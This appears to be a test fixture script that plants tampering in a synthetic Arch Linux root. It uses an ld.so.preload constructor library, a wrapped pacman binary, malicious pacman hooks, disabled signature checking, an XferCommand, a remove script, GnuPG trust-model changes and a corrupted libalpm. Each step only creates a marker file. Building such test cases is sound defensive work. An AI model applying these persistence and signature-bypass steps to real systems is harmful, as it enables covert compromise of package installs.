#!/bin/bash
# Plant pacman attacks in a synthetic Arch root (each touches /PWNED_<name>). TEST USE ONLY.
set -euo pipefail
T=$1; cd "$T"; ML=usr/lib/x86_64-linux-gnu
printf '#include <fcntl.h>\n#include <unistd.h>\n__attribute__((constructor)) static void p(void){int f=open("/PWNED_preload",O_CREAT|O_WRONLY,0644);if(f>=0)close(f);}\n' > /tmp/m.c
gcc -shared -fPIC -o $ML/libevil.so /tmp/m.c; echo /$ML/libevil.so > etc/ld.so.preload
mv usr/bin/pacman usr/bin/.pacman.real
printf '#!/bin/sh\n/usr/bin/touch /PWNED_pacman\nexec /usr/bin/.pacman.real "$@"\n' > usr/bin/pacman; chmod 755 usr/bin/pacman
printf '[Trigger]\nType = Package\nOperation = Install\nOperation = Upgrade\nOperation = Remove\nTarget = *\n\n[Action]\nDescription = evil\nWhen = PreTransaction\nExec = /usr/bin/touch /PWNED_hook\n' > etc/pacman.d/hooks/zz-evil.hook
sed -i 's|^Type = Path|Type = Package|; s|^Target = .*|Target = *\nOperation = Remove|; s|^Exec = .*|Exec = /usr/bin/touch /PWNED_syshook|' usr/share/libalpm/hooks/20-systemd-sysusers.hook
sed -i 's|^SigLevel = .*|SigLevel = Never|; s|^\[options\]|[options]\nXferCommand = /usr/bin/touch /PWNED_xfer %u\nNoUpgrade = usr/bin/pacman|' etc/pacman.conf
d=$(ls -d var/lib/pacman/local/pacman-mirrorlist-*); printf 'pre_remove() {\n  /usr/bin/touch /PWNED_install\n}\n' > $d/install
echo 'trust-model always' >> etc/pacman.d/gnupg/gpg.conf
python3 - "$(ls $T/$ML/libalpm.so.* | grep -v '\.so\.[0-9]*$' | head -1)" <<'EOF'
import sys; p = sys.argv[1]; b = bytearray(open(p, "rb").read()); b[-200] ^= 0xFF; open(p, "wb").write(bytes(b))
EOF
echo planted
